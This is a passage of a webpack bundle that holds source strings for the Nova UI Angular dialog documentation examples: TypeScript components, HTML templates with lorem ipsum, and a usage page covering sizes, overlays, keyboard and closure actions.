openWithComponent(): void {\n        const dialogRef = this.dialogService.open(\n            DialogContentExampleComponent,\n            { size: "sm" }\n        );\n        dialogRef.componentInstance.name = $localize`Dialog title`;\n    }\n}\n'},20417:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onButtonClick(\'Cancel\')" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onButtonClick(\'Action\')"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-custom-class-btn"\n    nui-button\n    type="button"\n    (click)="open(content)"\n    i18n\n>\n    Custom width dialog\n</button>\n'},68813:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-custom-class-example",\n    templateUrl: "./dialog-custom-class.example.component.html",\n})\nexport class DialogCustomClassExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            windowClass: "demoDialogCustomClass",\n        });\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},36541:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code> NuiDialogModule </code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    Dialog can be added by passing <code>template</code> to the\n    <code>DialogService\'s open</code> method. You can pass the result of the\n    dialog or the reason why dialog is dismissed by using <code>close</code> or\n    <code>dismiss</code> methods in your ng-template. All passed data can be\n    handled by <code>result</code> property of dialog\'s\n    <code>open</code> method.\n</p>\n<nui-example-wrapper\n    filenamePrefix="simple-dialog"\n    exampleTitle="Simple dialog"\n>\n    <nui-simple-dialog-example></nui-simple-dialog-example>\n</nui-example-wrapper>\n\n<h2>Usage as a Component</h2>\n\n<p>You can pass an existing component as content of the dialog window.</p>\n<p>\n    In this case remember to add content component as an entryComponents section\n    of your NgModule.\n</p>\n<p>\n    For this case you need to pass the component\'s class name to the\n    <code>open</code> method of <code>DialogService</code>.\n</p>\n<p>See both example panels below.</p>\n<nui-example-wrapper\n    filenamePrefix="component-as-content"\n    exampleTitle="Component as content for dialog"\n>\n    <nui-component-as-content-example></nui-component-as-content-example>\n</nui-example-wrapper>\n<nui-example-wrapper\n    filenamePrefix="dialog-content"\n    exampleTitle="Dialog Content Example Component"\n>\n    <p>\n        The code of this example panel is related to the example above. It only\n        shows code.\n    </p>\n</nui-example-wrapper>\n\n<h2>Severity</h2>\n\n<p>\n    You can pass <code>severity</code> property to the\n    <code>dialog-header</code> component and it will show different severity\n    styles. Possible values are: <code>critical, warning, info.</code>\n</p>\n<p>You can also add custom action buttons to the Dialog header.</p>\n<p>\n    In order to do so, you need to define them inside\n    <code>dialog-header</code> component, as shown in the example below.\n</p>\n<nui-example-wrapper\n    filenamePrefix="dialog-severity"\n    exampleTitle="Dialog Severity"\n>\n    <nui-dialog-severity-example></nui-dialog-severity-example>\n</nui-example-wrapper>\n\n<h2>Custom Dialog header</h2>\n\n<p>You can add custom action buttons to the Dialog header.</p>\n<p>\n    In order to do so, you need to define them inside\n    <code>dialog-header</code> component, as shown in the example below.\n</p>\n<nui-example-wrapper\n    filenamePrefix="header-buttons"\n    exampleTitle="Custom Dialog Header"\n>\n    <nui-header-buttons-example></nui-header-buttons-example>\n</nui-example-wrapper>\n\n<h2>Dialog Sizes</h2>\n\n<p>\n    You can define size of the dialog by passing it as second argument to\n    <code>DialogService\'s</code> <code>open</code> method. Possible sizes are:\n    <code>sm,</code><code>md,</code> and <code>lg</code>. Default size is\n    <code>md</code>.\n</p>\n<nui-example-wrapper filenamePrefix="dialog-sizes" exampleTitle="Dialog Sizes">\n    <nui-dialog-sizes-example></nui-dialog-sizes-example>\n</nui-example-wrapper>\n\n<h2>Position on screen</h2>\n\n<p>\n    When content is longer than available screen, dialog grows vertically by\n    default.\n</p>\n<p>\n    By adding <code>responsive-mode</code> class to the\n    <code>dialog-body</code>, dialog will fit the available screen and content\n    will be scrollable inside the dialog. Also it\'s possible to remove padding\n    from content in <code>dialog-body</code>by adding\n    <code>compact-mode</code> class\n</p>\n<nui-example-wrapper\n    filenamePrefix="dialog-position"\n    exampleTitle="Dialog Positions"\n>\n    <nui-dialog-position-example></nui-dialog-position-example>\n</nui-example-wrapper>\n\n<h2>Custom class</h2>\n\n<p>\n    It is possible to add custom class to the dialog window. In order to do it,\n    you need to pass <code>windowClass</code> option into\n    <code>DialogService open</code> method as second argument.\n</p>\n<p>\n    Here\'s an example:\n    <code\n        >DialogService.open(content, {{ "{" }} windowClass: "myCustomClass"\n        {{ "}" }})\n    </code>\n</p>\n<p>It will allow you to apply custom styles to the dialog if needed.</p>\n<p>Example below shows dialog with custom width (500px).</p>\n<p>\n    NOTE: custom class is applied to the dialog component which appended into\n    the <code>body</code> element.\n</p>\n<p>\n    That\'s why this class must be specified as <code>body</code> descendant\n    class.\n</p>\n<nui-message type="info">\n    Custom class styles can be overriden by default styles of\n    <code>nui-dialog</code> component. In this case please make custom class\n    selector more specific in your styles.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="dialog-custom-class"\n    exampleTitle="Custom Class"\n>\n    <nui-dialog-custom-class-example></nui-dialog-custom-class-example>\n</nui-example-wrapper>\n\n<h2>Confirmation Dialog</h2>\n\n<p>\n    You can use Confirmation Dialog by calling the <code>confirm</code> method\n    of DialogService. Set the <code>message</code> input to a string value that\n    will serve as the confirmation message. Optionally, you can customize the\n    title and button labels using the <code>title</code>,\n    <code>confirmText</code>, <code>dismissText</code> and\n    <code>severity</code> properties defined in\n    <a target="_parent" href="../interfaces/IConfirmationDialogOptions.html"\n        >IConfirmationDialogOptions</a\n    >.\n\n    <nui-message type="info">\n        By default, when the confirmation dialog opens, the\n        <code>Confirm</code> button is focused. Use <code>setFocus</code> input\n        to set the <code>Dismiss</code> button focused on dialog open.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="confirmation-dialog"\n    exampleTitle="Confirmation Dialog"\n>\n    <nui-confirmation-dialog-example></nui-confirmation-dialog-example>\n</nui-example-wrapper>\n\n<h2>Keyboard Options</h2>\n\n<p>\n    There is a field in <code>options</code> that allows dialog to be interacted\n    with via keyboard. Usage: <code>{{ "{" }} keyboard: false {{ "}" }}</code>\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="dialog-with-keyboard"\n    exampleTitle="Dialog With Keyboard"\n>\n    <nui-dialog-with-keyboard-example></nui-dialog-with-keyboard-example>\n</nui-example-wrapper>\n\n<h2>Static Backdrop</h2>\n<p>\n    By default, nui-dialog closes if user clicks outside the dialog. It is handy\n    though to keep the dialog on no matter where user clicks. To achieve this\n    behavior, it is recommended to use the <code>backdrop</code> input of the\n    component and set <code>static</code> string to it.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="dialog-with-static-backdrop"\n    exampleTitle="Dialog With Static Backdrop"\n>\n    <nui-dialog-with-static-backdrop-example></nui-dialog-with-static-backdrop-example>\n</nui-example-wrapper>\n\n<h2>Dialog Inside Overlay</h2>\n<p>\n    The implementation of the <code>nui-dialog</code> is not currently based on\n    <code>nui-overlay</code>, which means there might be a need to display the\n    dialog properly with overlay-based components, including nested ones. To\n    make the dialog open inside the overlay container it is enough to passe in\n    the <code>useOverlay</code> option when opening the dialog.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="dialog-inside-overlay"\n    exampleTitle="Dialog Inside Overlay"\n>\n    <nui-dialog-inside-overlay-example></nui-dialog-inside-overlay-example>\n</nui-example-wrapper>\n\n<h2>Dialog Closure Actions</h2>\n<p>\n    The <code>nui-dialog</code> provides you with a number of ways to perform\n    actions on it\'s closure. There are two built-in events <code>ESC</code> and\n    <code>BACKDROP_CLICK</code>\n    which are triggered by the keyboard escape key and clicking the dialog\'s\n    backdrop respectively. However, the user is able to create their own events,\n    which they can pass as an argument into the\n    <code>dismiss(event)</code> method of the <code>dialogRef</code>. To capture\n    the events there are two types of EventEmitters of the\n    <code>dialogRef</code> - <code>closed$</code> and\n    <code>beforeDismissed$</code>. As can be determined from their names, the\n    <code>closed$</code> event emitter will emit an event right after the dialog\n    window is closed, while the <code>beforeDismissed$</code> emits right before\n    the dialog is dismissed.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> <code>beforeDissmissed$</code> is only emitted on\n    dialog dismissal (or cancellation); it is not emitted on dialog submission.\n    <code>beforeDismissed$</code>works best in conjunction with the special\n    <code>beforeDismiss</code> function, which can be configured as an optional\n    configuration parameter of the dialog. This function, if it returns\n    <code>false</code>, will prevent the dialog from closing, until the\n    <code>close</code>\n    method is called. All this lets you be very flexible in how exactly you want\n    the dialog to be dismissed and when to perform certain actions.\n</nui-message>\n<p>\n    The example of the dialog\'s closure actions below shows how flexible a\n    simple dialog can be in terms of performing certain actions at certain\n    points of the dialog\'s lifecycle\n</p>\n\n<p>For this example:</p>\n<ol>\n    <li>\n        <strong>BACKDROP click</strong> - The logic specific to the backdrop\n        click is performed, and the dialog stays open in this case.\n    </li>\n    <li>\n        <strong>ESC key pressed</strong> - First, the logic specific to the ESC\n        button click is performed. Then, general logic before the dialog\n        dismissal is performed. And, finally, the logic to perform right after\n        dialog closure is run.\n    </li>\n    <li>\n        <strong>ACTION button pressed</strong> - The logic specific to the\n        ACTION button click is performed. Then, the custom DONE event is sent,\n        and finally the event is captured and custom logic is run in response.\n        The dialog stays open in this case.\n    </li>\n    <li>\n        <strong>CANCEL button pressed</strong> - The logic specific to the\n        CANCEL button click is performed. Then, general logic before the dialog\n        dismissal is performed. And, finally, the logic to perform right after\n        dialog closure is run.\n    </li>\n    <li>\n        <strong>Header Close button pressed</strong> - The logic specific to the\n        header Close button click is performed. Then, general logic before the\n        dialog dismissal is performed. And, finally, the logic to perform right\n        after dialog closure is run.\n    </li>\n</ol>\n\n<nui-example-wrapper\n    filenamePrefix="dialog-actions-before-closure"\n    exampleTitle="Dialog Actions Before Closure"\n>\n    <nui-dialog-actions-before-closure-example></nui-dialog-actions-before-closure-example>\n</nui-example-wrapper>\n\n<h2>Dialog Open Actions</h2>\n<p>\n    It\'s possible to perform some actions in your code when a dialog is opened\n    by subscribing to the\n    <code>DialogService</code>\'s <code>afterOpened$</code> observable. It emits\n    a <code>NuiDialogRef</code> that contains the component\'s data. This works\n    for both a confirmation dialog and a dialog containing a consumer-defined\n    component. The examples below trigger a toast on the top right of the page\n    when each dialog is opened.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    To see the source code of the consumer-defined component used in this\n    example, open the source expander of the second example panel in this\n    section.\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="dialog-after-opened"\n    exampleTitle="Perform an action on dialog open"\n>\n    <nui-dialog-after-opened-example></nui-dialog-after-opened-example>\n</nui-example-wrapper>\n<nui-example-wrapper\n    filenamePrefix="dialog-content"\n    exampleTitle="Dialog Content Example Component"\n>\n    <p>\n        The code of this example panel is related to the example above. It only\n        shows code.\n    </p>\n</nui-example-wrapper>\n'},27561:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    templateUrl: "./dialog-docs.example.component.html",\n})\nexport class DialogDocsComponent {}\n'},65089:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    id="nui-dialog-inside-overlay-with-date-time-picker-btn"\n    nui-button\n    type="button"\n    (click)="openInOverlay(headerButtonsContent)"\n    i18n\n>\n    Open Dialog\n</button>\n\n<ng-template #headerButtonsContent let-close="close">\n    <nui-dialog-header\n        title="Dialog Title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p>\n            <nui-date-time-picker\n                id="date-time-picker"\n                (modelChanged)="onModelChanged($event)"\n                displayMode="inline"\n                [model]="dt"\n                [appendToBody]="true"\n            ></nui-date-time-picker>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onCancel()" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onDone()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},71949:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, TemplateRef } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { DialogService, NuiDialogRef } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-inside-overlay-with-date-time-picker-example",\n    templateUrl:\n        "./dialog-inside-overlay-with-date-time-picker.example.component.html",\n})\nexport class DialogInsideOverlayWithDateTimePickerExampleComponent {\n    public dt: Moment;\n    public selectedDate: Date;\n\n    private activeDialog: NuiDialogRef;\n\n    constructor(private dialogService: DialogService) {\n        this.dt = moment();\n        this.selectedDate = new Date(this.dt.valueOf());\n    }\n\n    /**\n     * Notice that the \'useOverlay\' option is being passed in here\n     */\n    public openInOverlay(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n            useOverlay: true,\n        });\n    }\n\n    public onDone(): void {\n        this.activeDialog.close();\n    }\n\n    public onCancel(): void {\n        this.activeDialog.close();\n    }\n\n    public onModelChanged(event: any): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},18677:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    id="select-to-open-dialog"\n    placeholder="Select an item"\n    i18n-placeholder\n    [popupViewportMargin]="100"\n>\n    <nui-select-v2-option\n        *ngFor="let option of options1"\n        [value]="option"\n        (click)="openInOverlay(headerButtonsContent)"\n    >\n        {{ option }}\n    </nui-select-v2-option>\n</nui-select-v2>\n\n<ng-template #headerButtonsContent let-close="close">\n    <nui-dialog-header\n        title="Dialog Title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p>\n            <nui-select-v2 placeholder="Select an item" i18n-placeholder>\n                <nui-select-v2-option\n                    *ngFor="let option of options2"\n                    [value]="option"\n                >\n                    {{ option }}\n                </nui-select-v2-option>\n            </nui-select-v2>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onCancel()" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onDone()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},73681:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-inside-overlay-example",\n    templateUrl: "./dialog-inside-overlay.example.component.html",\n})\nexport class DialogInsideOverlayExampleComponent {\n    public options1 = Array.from({ length: 25 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public options2 = Array.from({ length: 25 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n\n    private activeDialog: NuiDialogRef;\n\n    constructor(private dialogService: DialogService) {}\n\n    /**\n     * Notice that the \'useOverlay\' option is being passed in here\n     */\n    public openInOverlay(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n            useOverlay: true,\n        });\n    }\n\n    public onDone(): void {\n        this.activeDialog.close();\n    }\n\n    public onCancel(): void {\n        this.activeDialog.close();\n    }\n}\n'},75566:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button\n            nui-button\n            type="button"\n            (click)="actionCanceled(); close()"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="actionDone(); close()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-with-keyboard-dialog-btn"\n    nui-button\n    type="button"\n    (click)="openWith(content)"\n    i18n\n>\n    Close me with ESC button\n</button>\n<button\n    id="nui-demo-without-keyboard-dialog-btn"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="openWithout(content)"\n    i18n\n>\n    ESC button won\'t close me\n</button>\n'},70474:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-with-keyboard-example",\n    templateUrl: "./dialog-with-keyboard.example.component.html",\n})\nexport class DialogWithKeyboardExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public openWith(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n    public openWithout(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n            keyboard: false,\n        });\n    }\n\n    public actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n\n    public actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n}\n'},84277:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close">\n    {{ test }}\n\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div\n        class="dialog-body"\n        [ngClass]="{ \'responsive-mode\': isResponsiveMode }"\n        tabindex="0"\n    >\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n\n        <p i18n>\n            Quisque ut pellentesque augue. Ut finibus malesuada lacus, a\n            elementum odio eleifend ac. Duis faucibus vehicula elit.\n            Pellentesque id metus enim. Praesent vestibulum ipsum vel venenatis\n            vehicula. Donec vel erat ex. Vivamus porta risus vitae risus tempus\n            accumsan.\n        </p>\n\n        <p i18n>\n            Duis euismod erat id metus euismod, interdum iaculis turpis tempus.\n            Nulla facilisi. Pellentesque ut purus nec lorem aliquam dictum ut\n            sit amet enim. Mauris laoreet vel mi eget suscipit. Aliquam ipsum\n            lacus, varius sed felis non, aliquet ultrices nisl. In tincidunt\n            quam sed faucibus vulputate. Lorem ipsum dolor sit amet, consectetur\n            adipiscing elit. Duis pellentesque elit sem, id aliquet metus\n            egestas sit amet. Maecenas quis justo in turpis lacinia aliquet.\n            Donec dignissim dolor nunc, in ultricies ligula sodales tincidunt.\n            Phasellus in nisi ac metus rutrum efficitur eu sed mi. Praesent et\n            porta leo. Curabitur sed maximus lectus. Aenean ac ex metus. Integer\n            facilisis id sapien quis sodales. Nam at eros sapien.\n        </p>\n\n        <p i18n>\n            Mauris consequat lectus diam. Cras auctor vestibulum lectus, id\n            pharetra nisl dapibus id. Sed tempor enim vel diam tincidunt\n            condimentum. Ut elementum, ante in ultricies pulvinar, elit metus\n            faucibus mauris, eu sodales lectus risus sit amet odio. Sed\n            ullamcorper maximus ante, ut lobortis libero rutrum lacinia. Nam\n            pretium erat ac velit egestas rutrum ultrices vel libero. Etiam\n            sollicitudin tempus leo. Quisque a elit a orci fringilla molestie.\n            Curabitur luctus dui risus, eget commodo lectus ullamcorper sit\n            amet. Nulla turpis ante, venenatis tempor ex semper, semper\n            vulputate enim. Duis sem nulla, egestas eu rhoncus et, egestas\n            malesuada neque.\n        </p>\n\n        <p i18n>\n            Fusce ut malesuada est. Ut ut placerat nunc. Vivamus mauris nisi,\n            luctus nec turpis quis, luctus porta ante. Aliquam erat volutpat.\n            Nulla facilisi. Maecenas id vehicula sem. Sed vitae sodales orci,\n            sed pretium mauris. Maecenas orci est, volutpat sit amet elit in,\n            gravida finibus justo. Vestibulum eget eros id risus elementum\n            interdum eu quis nisi. Donec ullamcorper enim tincidunt, volutpat\n            sem et, gravida sem. Fusce vitae tellus mauris. Nam non bibendum\n            urna. Ut vel pellentesque est, quis egestas ex. Nam lobortis quam\n            eget arcu tristique, id suscipit enim volutpat. Quisque pretium vel\n            nisl eu aliquet.\n        </p>\n\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed 